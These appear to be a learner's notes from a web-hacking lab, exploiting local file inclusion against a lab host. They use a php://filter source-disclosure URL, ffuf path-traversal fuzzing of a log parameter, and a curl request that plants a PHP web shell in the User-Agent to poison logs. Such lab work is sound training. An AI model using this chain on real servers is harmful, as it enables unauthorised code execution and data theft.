___
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt

```
http://83.136.253.171:44707/index.php?page=php://filter/read=convert.base64-encode/resource=index
```

```php
<?php 
	// echo '<li><a href="ilf_admin/index.php">Admin</a></li>'; 
?>
```

![[Pasted image 20241011131524.png]]

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://83.136.253.171:44707/ilf_admin/index.php?log=../../../../../FUZZ -fs 2046
```

![[Pasted image 20241011132046.png]]

```bash
curl -A '<?php system($_GET['cmd']); ?>' http://83.136.253.171:44707
```

![[Pasted image 20241011133107.png]]



